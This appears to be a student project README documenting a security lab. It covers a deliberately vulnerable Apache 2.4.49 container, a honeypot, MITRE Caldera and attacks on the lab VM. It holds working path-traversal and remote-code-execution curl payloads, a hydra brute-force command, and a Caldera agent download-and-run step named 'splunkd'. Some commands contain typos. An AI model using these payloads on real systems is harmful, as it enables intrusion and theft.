# ICS344-Project-Commands-and-codes

How we did the setup for everything in the project

 # 1-Docker:
the reason we wanted to install docker is because we needed to downgrade our apache service to something with known vulnerabilities we used the following commands to install it on the vm.

-sudo apt-get install -y docker.io

-sudo systemctl start docker & sudo systemctl enable docker

-docker –version (to make sure it is correctly installed)
 # 2-Apache 2.4.49:
 after installing docker we need to make a dockerfile with all the files and dependencies will go through the steps we did to set it up correctly
-nano DockerFile
-write in the dockerfile the following (FROM debian:latest
RUN apt-get update && \
    apt-get install -y wget build-essential libpcre3 libpcre3-dev libssl-dev libexpat1-dev && \
    wget https://archive.apache.org/dist/httpd/httpd-2.4.49.tar.gz && \
    wget https://archive.apache.org/dist/apr/apr-1.7.0.tar.gz && \
    wget https://archive.apache.org/dist/apr/apr-util-1.6.1.tar.gz && \
    tar -xzf httpd-2.4.49.tar.gz && \
    tar -xzf apr-1.7.0.tar.gz && \
    tar -xzf apr-util-1.6.1.tar.gz && \
    mv apr-1.7.0 httpd-2.4.49/srclib/apr && \
    mv apr-util-1.6.1 httpd-2.4.49/srclib/apr-util && \
    cd httpd-2.4.49 && \
    ./configure --enable-so --enable-ssl --with-mpm=event && \
    make && \
    make install

EXPOSE 80
CMD ["/usr/local/apache2/bin/httpd", "-D", "FOREGROUND"])
- after saving the file we need to build the image the containers will be using with the following command 'sudo docker build -t apache-2.4.49'
- -then use 'sudo docker run -d -p 8080:80 apache-2.4.49' to make the container with apache running on port 8080

# 3- Honeypot:
for the honeypot we picked HoneyUp which works okay with our service, but to be able to use honeyup we need to install nginx among other things to be able to fully use it and have logs to read after.

- installing nginx using the following command sudo apt install nginx -y

- using this command  sudo systemctl start nginx to make sure everything is running okay

- we need the rust toolchain which we installed using curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

- and we needed rustup and cargo which we installed using sudo apt install cargo && sudo apt install rustup

- now we can install honeyup using git clone https://github.com/LogoiLab/honeyup.git

- cargo build –release so we can compile it.

# 4-Attack Tools:
we needed to install some tools that we might use for attacks and we used the following command

-sudo apt install nmap metasploit-framework hydra gobuster nikto -y
# 5-Caldera:
Caldera is a necessary part to complete the project so we followed these commands to install it correctly and making sure it runs without errors.

-git clone https://github.com/mitre/caldera.git --recursive

-pip3 install -r requirements.txt

-python3 server.py --insecure –build (use --build if it is running for the first time, after the first time you can remove it and it will run okay).

- to be able to run operations in caldera we need an agent the following code we used to make an agent (server 'http: //192. 168.112.129:8888' ;
curl-s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download › splunkd;
chmod +x splunkd;
./splunkd -server $server -group red -v)

# 6-Attacks

-we did the nmap scan on the target using (nmap --script vuln -p 8080 192.168.206.129).

-one of the vulnerabilities in apache 2.4.49 is remote code execution we used this code to attack curl -X POST "http://192.168.206.129:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo RCE Test"

-one of the vulnerabilities in apache 2.4.49 is path traversal we used this code to attack curl http://192.168.206.129:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd

-one of the vulnerabilities in apache 2.4.49 is the fact that http trace is enabled we cannot really use it as an attack without having something else to use it with but we did use a command to see if it is enabled or not with curl -X TRACE http://192.168.206.129:8080 -I

-using kali tools we managed to brute force our apache server using hydra tool with the following code hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 192.168.206.129 -s 8080 http-get / 


